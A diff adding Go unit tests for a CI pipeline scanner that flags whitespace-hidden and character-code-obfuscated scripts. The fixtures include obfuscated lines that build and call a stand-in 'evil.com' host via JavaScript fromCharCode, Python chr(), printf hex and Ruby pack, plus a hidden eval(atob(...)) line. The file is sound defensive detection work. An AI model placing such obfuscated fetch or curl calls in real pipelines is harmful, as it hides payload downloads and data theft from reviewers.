@@ -141,3 +141,116 @@ func TestCheckObfuscation(t *testing.T) {
 		}
 	}
 }
+
+func TestWhitespaceHiding_ExcessiveLeadingSpaces(t *testing.T) {
+	spaces := "                                                    " // 52 spaces
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "build",
+			Script: []string{spaces + `eval(atob("malicious_payload")))`},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, WhitespaceHidingID) {
+		t.Fatalf("expected %s finding for excessive whitespace", WhitespaceHidingID)
+	}
+}
+
+func TestWhitespaceHiding_NormalIndent(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "test",
+			Script: []string{"    echo 'normal indent'"},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if hasFindingID(findings, WhitespaceHidingID) {
+		t.Fatalf("did not expect %s finding for normal indentation", WhitespaceHidingID)
+	}
+}
+
+func TestCharCodeObfuscation_FromCharCode(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "inject",
+			Script: []string{`node -e "var h=String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108); fetch(h)"`},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, CharcodeObfuscationID) {
+		t.Fatalf("expected %s finding for String.fromCharCode", CharcodeObfuscationID)
+	}
+}
+
+func TestCharCodeObfuscation_PythonChr(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "exfil",
+			Script: []string{`python3 -c "import urllib.request; urllib.request.urlopen(chr(104)+chr(116)+chr(116)+chr(112)+chr(58)+chr(47)+chr(47)+chr(101)+chr(118)+chr(105)+chr(108))"`},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, CharcodeObfuscationID) {
+		t.Fatalf("expected %s finding for Python chr()", CharcodeObfuscationID)
+	}
+}
+
+func TestCharCodeObfuscation_PrintfHex(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "c2",
+			Script: []string{`URL=$(printf '\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d'); curl $URL`},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, CharcodeObfuscationID) {
+		t.Fatalf("expected %s finding for printf hex", CharcodeObfuscationID)
+	}
+}
+
+func TestCharCodeObfuscation_NoFalsePositive(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "test",
+			Script: []string{`echo "normal script"`, `printf "hello world\n"`},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if hasFindingID(findings, CharcodeObfuscationID) {
+		t.Fatalf("did not expect %s finding for normal script", CharcodeObfuscationID)
+	}
+}
+
+func TestCharCodeObfuscation_RubyPack(t *testing.T) {
+	doc := &pipeline.Document{
+		Jobs: []pipeline.Job{{
+			Name:   "payload",
+			Script: []string{`ruby -e 'url = [104, 116, 116, 112, 58, 47, 47].pack("C*"); system("curl #{url}")'`},
+		}},
+	}
+	findings, err := Run(doc)
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if !hasFindingID(findings, CharcodeObfuscationID) {
+		t.Fatalf("expected %s finding for Ruby pack", CharcodeObfuscationID)
+	}
+}
